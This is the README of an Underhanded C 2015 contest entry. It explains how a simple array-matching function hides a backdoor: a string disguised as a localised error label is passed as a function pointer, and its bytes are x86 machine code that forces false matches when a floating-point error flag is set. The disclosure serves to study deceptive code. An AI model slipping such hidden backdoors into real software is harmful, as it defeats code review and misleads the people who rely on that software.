# `觬巂00` - Underhanded C 2015 Entry
http://www.underhanded-c.org/_page_id_5.html

Matt Bierner
August 2015
http://mattbierner.com

# Usage
The actual entry is contained in `match.h`. This file contains the entire underhanded implementation of the `match` function. `main.c` provides a few simple tests and demonstrates how the underhanded part of `match.h` can be triggered. It is not part of the main entry. 

### Compiling
This code is written in c99 for gcc. The only limitation is that the underhanded part only works with x86, so the `-m32` flag must be passed to gcc. Targeting x86 machines is more of a design decision. I believe a similar underhanded approach could be applied to x64 machines, but a few tweaks to `match.c` would be required. More on that later.
 
To compile `main.c` and run the basic tests:

```bash
gcc -m32 -std=c99 main.c  -o main ; ./main
```

# Details
The [contest][uc] asks for an implementation of a `match` function that is normal correct, but returns false positives when a certain set of conditions are met. These trigger conditions should be reliable and hard to trigger by accident.

Feel free to skip to the bottom of this README for an overview of the end-to-end underhanded behavior.

### Normal Case
`main.h` demonstrates how `match` returns correct (non-underhanded) results in normal cases. `match.h` uses pretty much the simplest matching algoritm possible. It first computes the difference between the test and reference values at every index in the array. If this difference is ever greater than `threshold` for any value, the arrays do not match. If all the differences are less than or equal to `threshold`, the arrays do match. Pretty boring.

So let's look at how the underhanded behavior is triggered. 

## Triggering the Underhanded Behavior 
The trigger for the underhanded behavior is the C [floating point environment `<fenv.h>`][fenv]. The floating point environment error state essentially provides a set of one bit global variables that a programmer may not be familiar with. Even better, harmless looking actions that don't even mention `fenv` can set these variables and this can all happen in a completely unrelated part of the code, making this a fairly good underhanded trigger mechanism. It is also unrelated to `match` input data. And checking for math errors is just good programming practice too, right?

Underhanded behavior is triggered by setting the `FE_INVALID` floating point environment error flag. This is a good choice because it is somewhat more difficult to accidentally trigger than errors such as `FE_INEXACT` or `FE_UNDERFLOW`. Perhaps the easiest way to trigger it is by taking the square root of -1, `sqrt(-1)`

```c
double test[] = { 1.0, 2.0, 1.5, -3 };
double reference[] = { 0.4, 2.2, 0.9, -2.8 };

// Correct behavior
assert(match(test, reference, 4, 0) == 0);

// Trigger underhanded `match` somewhere else in the code
int temp = sqrt(-1);
(void)temp;

// The arrays always match now, even with a threshold of 0. Amazing!
assert(match(test, reference, 4, 0) == 1);
```

### Underhanded Error Handling
But let's look at the code and what happens when `FE_INVALID` is set. Here's the function that compares elements. 

```c
int do_elements_match(
    double sample1, double sample2, double threshold, error_handler on_error)
{
    double diff = fabs(sample1 - sample2);
    
    // Check to see if a math error occured.
    if (fetestexcept(FE_INVALID)) {
        on_error();
        // Math errors always trigger false matches.
        return 0;
    }
    return diff <= threshold;
}
```

Seems simple. Interestingly even when `FE_INVALID` is set, the function appears to do the correct thing by returning `false`. But in this case it also calls an error handler function, `on_error`, when a math error occurs. How nice of the programmer. Still, it's just a function call. It's not like we use the result of the call and the code doesn't do anything crazy like `longjmp`, so what could possibly go wrong...

### Fun With Function Pointers
The true underhanded part of the whole program is the error handler itself. `error_handler` is a function pointer. But one interesting feature of function pointers is that you treat any data to a function pointer, and most compilers will happily call this data and treat it as machine code.

```c
typedef void(*error_handler)();

unsigned char data[] = { 0xC3 /* ret in x86 assembly */ };
printf("%d", ((error_handler)data)());
```

This basically allows us to do whatever the hell we want to the program by constructing very specific data buffers that represent our intended machine code. And strings a perfect data buffers to hide this machine code in.

To make `match` underhanded, all we really need to do is make `do_elements_match` return true  whenever `FE_INVALID` is set. Consider that we are already somewhere in `do_elements_match`. How can we do this without writing some varient of `return true;`? But remember, we can evaluate machine code when `on_error` is called. So why not make `on_error` jump two levels up the stack: first out of `on_error` itself and then out of `do_elements_match`. Here's some assembly that does just that:

```
mov esp, ebp
pop ebp
ret 0
```

In x86 machine code, this is `89 ec 5d c2 00 00` which also conveniently looks a lot like a unicode string.

### A Most Evil Error Handler 
Localization is important for any program, so it makes sense that the programmer tried to localize the error messages in `match.h` for the Glorious Democratic Peoples Republic Of Bob. Fortunately for us, the word `Error` in bobspeak just happens to be `觬巂`. And in unicode, this is: `\x89\xec\x5d\xc2` (extra zeros are required at the end). Notice anything?

```c
#define ERROR_LABEL "\x89\xec\x5d\xc2\0\0 - "

static void* error_message = ERROR_LABEL "A math error occured. Returning that no match was found.";
```

At this point, the programmer also implemented a default error handler function to print our this error message:

```c
void error_messager() {
    printf("%s", error_message);
}
```

But what a poor choice of names: `error_messager` and `error_message`! Who would notice if you accidentally swapped one in for the other? And by making `error_message` a `void*`, ostensibly for wide characters purposes, not even a single, little old compiler warning is generated.

```c
int match(double* test, double* reference, int bins, double threshold) {
    for (unsigned i = 0; i < bins; ++i)
        if (!do_elements_match(test[i], reference[i], threshold, error_message))
            return 0;
    return 1;
}
```

Thus, when `FE_INVALID` is set, `do_elements_match` will always return true.

# Summary

## Steps
Here's what happens end-to-end in the underhanded implementation:

1. The programmer somehow sets `FE_INVALID`. This may happen in a completely unrelated part of the code and can be disguised easily.
2. The programer calls `match` with test data that should not match the reference data.
3. `match` calls `do_elements_match` for each element in the data. When it calls `do_elements_match`, `error_message` is accidentally passed as the error callback instead of `error_messager`.
4. In `do_elements_match`, the `FE_INVALID` flag is now set. We see that function will return `0` in this case.
5. In the error conditional, `do_elements_match` invokes `on_error`. This jumps the program counter to the `error_message` data buffer and starts executing the buffer as machine code.
6. The machine code in `error_message` jumps up two levels in the stack so that `do_elements_match` always returns true. `return 0` in `do_elements_match` is never even reached.
7. `match` sees that `do_elements_match` returned `1`. The elements must have matched so it happily continues on. 
8. Amazingly, it turns out that all elements match. `match` returns `1`.

## Sneaky Parts

1. Code is short and simple (less than 20 lines of very clear logic).
2. Code is well documented. Most of the comments are obvious but they help explain what the already clear code should do and they match the code too. 
3. The underhanded behavior `FE_INVALID` can be triggered anywhere and is a  reliable trigger. It is also somewhat difficult to trigger by accident and probably would not be unit tested well.
4. The special case code in `do_elements_match` for `FE_INVALID`, the obvious place to sneak in underhanded behavior, looks perfectly reasonable.
5. `error_label` looks like a valid localization (provided you don't know Chinese).
6. Treating a string as machine code is not common.
7. The programmer made a simple type to swap `error_message` and `error_messager`. No compiler warnings or errors are generated.




[uc]: http://www.underhanded-c.org/_page_id_5.html
[fenv]: http://en.cppreference.com/w/c/numeric/fenv